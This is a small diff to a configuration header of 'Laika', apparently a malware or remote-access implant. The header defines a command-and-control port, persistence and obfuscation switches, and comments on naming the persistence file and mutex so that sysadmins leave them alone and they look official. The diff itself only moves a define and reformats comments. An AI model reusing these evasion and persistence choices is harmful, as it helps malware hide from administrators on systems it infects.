@@ -13,16 +13,16 @@
 #define LAIKA_CNC_PORT "@LAIKA_CNC_PORT@"
 
 /* settings */
+#cmakedefine LAIKA_DEBUG_BUILD
 #cmakedefine LAIKA_PERSISTENCE
 #cmakedefine LAIKA_OBFUSCATE
-#cmakedefine LAIKA_DEBUG_BUILD
 
 /* raw obfuscated strings */
 
 /* =====================================[[ Linux Strings ]]===================================== */
 
-/*      we want a semi-random file lock that is stable between similar builds,
-*   so we use the GIT_VERSION as our file lock :D */
+/* we want a semi-random file lock that is stable between similar builds,
+*  so we use the GIT_VERSION as our file lock :D */
 #define LAIKA_LIN_LOCK_FILE "/tmp/" LAIKA_VERSION_COMMIT
 
 /* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
@@ -33,8 +33,8 @@
 
 /* ====================================[[ Windows Strings ]]==================================== */
 
-/*      we want a semi-random mutex that is stable between similar builds,
-*   so we use the GIT_VERSION as our mutex :D */
+/* we want a semi-random mutex that is stable between similar builds,
+*  so we use the GIT_VERSION as our mutex :D */
 #define LAIKA_WIN_MUTEX LAIKA_VERSION_COMMIT ".0"
 
 /* looks official enough */
